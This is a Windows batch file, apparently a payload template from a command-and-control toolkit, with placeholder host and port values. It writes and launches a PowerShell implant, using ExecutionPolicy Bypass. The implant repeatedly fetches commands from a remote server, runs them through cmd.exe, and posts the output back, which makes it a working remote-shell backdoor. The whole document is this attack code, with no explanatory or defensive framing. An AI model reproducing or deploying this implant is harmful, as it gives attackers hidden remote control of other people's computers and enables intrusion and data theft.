@echo off
setlocal ENABLEDELAYEDEXPANSION
set "line={line}" 
set "lhost={lhost}"
set "lport={lport}"
set "SOURCE_FILE=%line%.ps1"

(

echo $C2_URL = 'http://%lhost%:%lport%'
echo $CLIENT_ID = '%line%'
echo function Send-Request {
echo     param (
echo         [string]$url,
echo         [string]$method = 'GET',
echo         [string]$body = ''
echo     )
echo
echo     try {
echo         if ($method -eq 'GET') {
echo             $response = Invoke-RestMethod -Uri $url -Method Get
echo         } elseif ($method -eq 'POST') {
echo             $headers = @{ 'Content-Type' = 'application/json' }
echo             $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -Headers $headers
echo         }
echo         return $response
echo     } catch {
echo         Write-Error "Error: $_"
echo     }
echo }
echo
echo # Main loop to keep checking for commands
echo while ($true) {
echo     try {
echo         $command = Send-Request "$C2_URL/command/$CLIENT_ID"
echo
echo         if ($command) {
echo             if ($command -match 'terminate') {
echo                 break
echo             }
echo
echo             $output = cmd.exe /c $command 2^>^&1
echo
echo             $json_data = @{ output = $output } ^| ConvertTo-Json
echo             Send-Request "$C2_URL/command/$CLIENT_ID" -method 'POST' -body $json_data
echo         }
echo
echo         Start-Sleep -Seconds 5
echo     } catch {
echo         Write-Error "Error: $_"
echo         break
echo     }
echo }
) > "%SOURCE_FILE%"
powershell -ExecutionPolicy Bypass -File "%SOURCE_FILE%"
